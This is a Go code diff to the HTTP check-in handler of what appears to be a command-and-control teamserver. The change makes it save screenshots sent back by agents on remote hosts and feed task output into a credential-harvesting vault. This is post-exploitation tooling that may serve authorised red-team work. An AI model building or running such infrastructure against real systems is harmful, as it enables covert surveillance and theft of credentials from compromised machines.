@@ -9,6 +9,8 @@ import (
 	"io"
 	"net"
 	"net/http"
+	"os"
+	"path/filepath"
 	"sync"
 	"time"
 
@@ -16,6 +18,7 @@ import (
 	"github.com/rs/zerolog/log"
 
 	"apex/teamserver/internal/agents"
+	"apex/teamserver/internal/credentials"
 	"apex/teamserver/internal/tasks"
 )
 
@@ -28,16 +31,18 @@ type HTTPListener struct {
 	checkins chan CheckIn
 	agents   *agents.Manager
 	tasks    *tasks.Queue
+	creds    *credentials.Vault
 	running  bool
 	mu       sync.RWMutex
 }
 
-func NewHTTP(cfg Config, agentMgr *agents.Manager, taskQueue *tasks.Queue) *HTTPListener {
+func NewHTTP(cfg Config, agentMgr *agents.Manager, taskQueue *tasks.Queue, credVault *credentials.Vault) *HTTPListener {
 	return &HTTPListener{
 		config:   cfg,
 		checkins: make(chan CheckIn, 256),
 		agents:   agentMgr,
 		tasks:    taskQueue,
+		creds:    credVault,
 	}
 }
 
@@ -238,6 +243,19 @@ func (h *HTTPListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
 	// Publish task results and broadcast to operator UI (use bgctx for reliability)
 	for _, res := range req.Results {
 		out, _ := base64.StdEncoding.DecodeString(res.Output)
+
+		// Detect binary screenshot data (BMP magic "BM") and save to file
+		if len(out) > 2 && out[0] == 'B' && out[1] == 'M' {
+			dir := filepath.Join("data", "screenshots")
+			_ = os.MkdirAll(dir, 0755)
+			fname := fmt.Sprintf("%s_%s.bmp", agentID[:8], time.Now().Format("20060102_150405"))
+			fpath := filepath.Join(dir, fname)
+			if err := os.WriteFile(fpath, out, 0644); err == nil {
+				out = []byte(fmt.Sprintf("Screenshot saved to %s (%d bytes)", fpath, len(out)))
+				log.Info().Str("agent_id", agentID).Str("path", fpath).Msg("Screenshot captured and saved")
+			}
+		}
+
 		tr := &tasks.TaskResult{
 			TaskID:    res.TaskID,
 			AgentID:   agentID,
@@ -247,6 +265,11 @@ func (h *HTTPListener) handleCheckIn(w http.ResponseWriter, r *http.Request) {
 		}
 		_ = h.tasks.PublishResult(bgctx, tr)
 		h.agents.BroadcastTaskResult(agentID, tr)
+
+		if h.creds != nil && res.Success && len(out) > 0 {
+			h.creds.ParseOutput(bgctx, agentID, "task:"+res.TaskID, string(out))
+		}
+
 		log.Debug().
 			Str("agent_id", agentID).
 			Str("task_id", res.TaskID).
